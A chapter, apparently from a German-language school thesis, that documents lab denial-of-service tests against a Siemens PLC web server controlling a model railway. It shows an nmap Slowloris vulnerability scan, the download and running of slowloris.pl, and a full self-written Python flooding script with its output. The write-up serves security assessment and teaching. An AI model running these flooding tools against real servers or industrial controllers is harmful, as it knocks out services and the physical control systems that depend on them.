#import "@preview/htl3r-da:1.0.0" as htl3r
#htl3r.author("Esther Lina Mayer")

= Denial of Service
== Theoretische Grundlagen
Ein Denial of Service-Angriff (DoS-Angriff) ist eine Attacke auf die
Verfügbarkeit eines Services auf einem Gerät. Hierbei möchte ein Angreifer die
normale Funktionalität eines Services unterbrechen beziehungsweise behindern,
indem er die Dienste auf dem Computer mit Anfragen überlädt. Ein DoS wird von einem Gerät aus
gestartet - werden mehrere verwendet (z.B. aus einem Botnet), dann spricht
man von einem Distributed Denial of Service-Angriff (DDoS-Angriff).

DoS-Angriffe sind effektiv - auch gegen starke Ziele. Sie können einfach
und ohne großen Aufwand ausgeführt werden. Angreifer überfluten ihr Ziel
mit Massen an Paketen, die die Kapazität des Geräts überfordern,
welches so neuen Nutzern den Zugang zu Services verweigern und bestehende
Verbindungen verlangsamt.

== Slowloris
Slowloris ist ein Tool, welches speziell für Angriffe auf Webserver geschrieben wurde.
Es öffnet eine Vielzahl an HTTP(S)-Verbindungen und versucht, diese so lange wie möglich
offen zu halten. Ein großer Vorteil des Tools ist es, dass es kaum Netzwerkressourcen
benötigt.

=== Testen der Anfälligkeit auf Slowloris
Das Tool nmap, welches für die Port-Scans im Kapitel "Port-Scanning" bereits installiert wurde, besitzt ein
eingebautes Script#footnote("https://nmap.org/nsedoc/scripts/http-slowloris.html"),
welches die Anfälligkeit eines Servers auf einen möglichen Slowloris-Angriff testet.

Hierfür kann die Option `--script http-slowloris` verwendet werden, um das Skript
auszuführen. Weiters empfiehlt nmap die Verwendung von `--max-parallelism 400`, um
die Aggressivität des Skriptes zu erhöhen. Diese Option legt die maximale
Anzahl an zeitgleichen Verbindungen fest. Der gesamte Befehl lautet:

`nmap --script http-slowloris --max-parallelism 400 10.100.0.1`

#pagebreak()

Die Ausgabe des Befehls lautet wie folgt:

```
C:\Users\esthie>nmap --script http-slowloris --max-parallelism 400 10.100.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 14:47 Mitteleuropõische Zeit
Nmap scan report for 10.100.0.1
Host is up (0.0029s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
| http-slowloris:
|   Probably vulnerable:
|   the DoS attack took +12s
|   with 949 concurrent connections
|   and 0 sent queries
|_  Monitoring thread couldn't communicate with the server. This is probably due to max clients exhaustion or something similar but not due to slowloris attack.
135/tcp  open  msrpc
8443/tcp open  https-alt
|_http-slowloris: false
MAC Address: 4C:E7:05:93:E7:F2 (Siemens Industrial Automation Products, Chengdu)

Nmap done: 1 IP address (1 host up) scanned in 1836.76 seconds
```

Ab Zeile 9 findet sich das Ergebnis des Scans: "`Probably vulnerable`". Die SPS ist
also anfällig für einen DoS-Angriff.

=== Vorbereitung von Slowloris
Slowloris wird in einer Virtuellen Maschine am Management-PC installiert. Das
Betriebssystem der VM kann beliebig gewählt werden. Im folgenden wird die
Kali-Linux-VM verwendet, welche im Kapitel Port-Scanning für unicornscan
aufgesetzt wurde. Hierfür werden die folgenden Befehle ausgeführt.

```
wget https://web.archive.org/web/20090620230243/http://ha.ckers.org/slowloris/slowloris.pl
chmod +x slowloris.pl
sudo apt-get install libio-socket-ssl-perl
```

#pagebreak()

=== Durchführung von Slowloris
Das Skript kann mit dem folgenden Befehl ausgeführt werden.

```
┌──(esther㉿Jellyfish-Fields)-[/mnt/c/Users/esthie]
└─$ perl slowloris.pl -dns 10.100.0.1

CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::
CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::
CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::
CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::
CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc
ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
.......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco

 Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client

 Defaulting to port 80.
 Defaulting to a 5 second tcp connection timeout.
 Defaulting to a 100 second re-try timeout.
 Defaulting to 1000 connections.
 Multithreading enabled.
```

#pagebreak()

Im obigen Befehl wird kein Port angegeben, da per default der Port 80
verwendet wird. Der Output lautet wie folgt.

```
Connecting to 10.100.0.1:80 every 100 seconds with 1000 sockets:
                Building sockets.
                Building sockets.
                Building sockets.
                Building sockets.
                Building sockets.
                Building sockets.
                Building sockets.
                Sending data.
Current stats:  Slowloris has now sent 524 packets successfully.
This thread now sleeping for 100 seconds...

                Building sockets.
                Building sockets.
                Building sockets.
                Building sockets.
                Sending data.

[...]

                Sending data.
Current stats:  Slowloris has now sent 51504 packets successfully.
This thread now sleeping for 100 seconds...

^C
```

Der Code ist aus Gründen der Übersichtlichkeit gekürzt. Außerdem ist ersichtlich, dass
das Skript nach 51504 Paketen abgebrochen wurde (`^C`). Parallel wurden Tests
ausgeführt - welche im folgenden Abschnitt dieses Kapitels noch genauer beschrieben und
interpretiert werden. Um es kurz zu sagen: Die Tests verliefen positiv.
Slowloris konnte den HTTP-Server der SPS nicht lahmlegen.

#pagebreak()

=== Stabilitätstests während Slowloris
Die Erwartung an den DoS-Angriff ist es, dass ein User, welcher das Bahnnetzwerk über
den Webserver der SPS steuern möchte, keinen Zugriff auf diesen hat. Während der
Ausführung des Slowloris-Skripts wurde laufend ein Tests des Webservers und der
Kommunikation mit dem Raspberry Pi durchgeführt.

Zur Demonstration der Funktionalität ist im folgenden ein Ablauf der Kommunikation
dokumentiert. Dieser wurde mehrfach durchgeführt.

1. Zugriff auf den Webserver: Der User kann auf den Webserver der SPS zugreifen und die Weichen (hier Weiche 2) ansteuern.

#figure(
  image("../assets/angriffe/dos/sps_screenshot.png", width: 90%),
  caption: "Editieren der Position von Weiche 2"
)

2. Kommunikation zum Raspberry Pi: Die SPS muss nun die Änderungen der Weichen an den Raspberry Pi weiter geben. Dieser wirft Log-Messages, sobald er eine Änderung empfängt.

#figure(
  image("../assets/angriffe/dos/py_log.png", width: 90%),
  caption: "Log-Messages auf dem Raspberry Pi"
)

Aus der Abbildung ist ersichtlich, dass die Weiche 2 einen neuen Wert erhält. Die
Kommunikation zwischen der SPS und dem Raspberry Pi ist also erfolgreich.

_Anmerkung: Eine genaue Beschreibung, was die Log-Messages bedeuten, befindet sich
im Kapitel über die Komponenten._

#pagebreak()

=== Ergebnis von Slowloris
Laut der Analyse durch das Skript von nmap ist die SPS anfällig auf einen
Slowloris-DoS-Angriff. Nach rund 50.000 Paketen, welche durch Slowloris
abgesendet wurden, gab es jedoch keine (erkennbare) Einschränkung des
Webservers der SPS.

== Python-Skript - Denial of Service-Angriff
Da der Angriff mit Slowloris fehlgeschlagen ist, musste eine alternative Möglichkeit
für einen Angriff ausgesucht werden, um eine "zweite Meinung" einzubringen. Hierfür
wurde ein selbst geschriebenes Python-Skript erstellt, welches Verbindungen mit
dem Webserver der SPS aufbaut.

=== Vorbereitung des Python-Skripts
Das Skript `dos.py` lautet wie folgt.

```python
import requests
import threading
import time
from datetime import datetime

failure_count = 0
success_count = 0
lock = threading.Lock()

def send_request(url):
    global failure_count, success_count
    try:
        start_time = time.time()
        response = requests.get(url, timeout=5)
        response_time = time.time() - start_time

        if response.status_code == 200:
            with lock:
                success_count += 1
        else:
            with lock:
                failure_count += 1
    except requests.exceptions.RequestException as e:
        with lock:
            failure_count += 1

def health_check(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print(f"[Health Check] Unexpected status: {response.status_code}. Current time: {datetime.now()}")
            return False
    except requests.exceptions.RequestException:
        print(f"[Health Check] Server is unresponsive. Current time: {datetime.now()}")
        return False

def stress_test(url, thread_count):
    global failure_count, success_count
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

        if len(threads) % 100 == 0:
            health_check(url)

    for thread in threads:
        thread.join()

    print(f"Test complete. Success: {success_count}, Failures: {failure_count}")

if __name__ == "__main__":
    target_url = "http://10.100.0.1"
    threads = 1000
    print(f"Starting DoS attack at {datetime.now()}")
    stress_test(target_url, threads)
    print(f"Finished DoS attack at {datetime.now()}")
```

#pagebreak()

=== Durchführung des Python-Skrips
Das Skript wird ebenfalls von der Kali-Linux-VM (siehe Kapitel Port-Scanning) ausgeführt.

```
┌──(esther㉿Jellyfish-Fields)-[/mnt/c/Users/esthie]
└─$ python3 dos.py
Starting DoS attack at 2025-01-22 16:53:47.557767
[Health Check] Server is unresponsive. Current time: 2025-01-22 16:53:47.784634
[Health Check] Server is unresponsive. Current time: 2025-01-22 16:53:48.258507
[Health Check] Server is unresponsive. Current time: 2025-01-22 16:53:48.493758
[Health Check] Server is unresponsive. Current time: 2025-01-22 16:53:48.735463
[Health Check] Server is unresponsive. Current time: 2025-01-22 16:53:49.298863
Test complete. Success: 326, Failures: 674
Finished DoS attack at 2025-01-22 16:53:50.205103
```

Aus der Ausgabe ist ersichtlich, dass der Server aus 1000 aufgebauten
Verbindungen 674-mal nicht erreichbar war - ersichtlich in Zeile 9.

=== Ergebnisse des Python-Skripts
Im Gegensatz zu den Tests während dem Slowloris-Angriff ist das Python-Skript
erfolgreich gewesen. Im Laufe der Tests wurde die Verbindung auf den Webserver der
SPS abgebrochen.

Erwähnenswert ist, dass die Anzahl der Verbindungen drastisch erhöht werden musste,
um einen Effekt zu erzielen. Beim erfolgreichen Versuch wurden die Verbindungen
auf 100.000 hochgestuft.

#figure(
  image("../assets/angriffe/dos/dos_success.png", width: 80%),
  caption: "Fehlermeldung beim Zugriff auf den Webserver der SPS"
)

#pagebreak()

== Fazit
Ein DoS-Angriff stellt also eine Gefahr für die SPS und damit das gesamte
Bahnnetzwerk dar, da der User nicht auf Weichen und Blockschaltung zugreifen kann.
Weiters kann man nicht sicher sein, was mit dem Programm oder gespeicherten Variablen
während einer Überlastung auf der SPS passiert.

Erwähnenswert ist, dass der Webserver der SPS eine enorme Masse an Verbindungen
ohne Probleme verarbeiten konnte.


/*
TODO add sources
https://www.ncsc.gov.uk/collection/denial-service-dos-guidance-collection
https://www.cloudflare.com/learning/ddos/glossary/denial-of-service/
https://de.wikipedia.org/wiki/Denial_of_Service
https://www.ncsc.gov.uk/files/Preparing%20for%20DoS%20(Denial%20of%20Service)%20attacks_V2.pdf
Zugriff 24.01. für 1-2 und 31.01. für 3, 4

30.12.
https://de.wikipedia.org/wiki/Slowloris
https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/

4.1
https://nmap.org/nsedoc/scripts/http-slowloris.html

*/

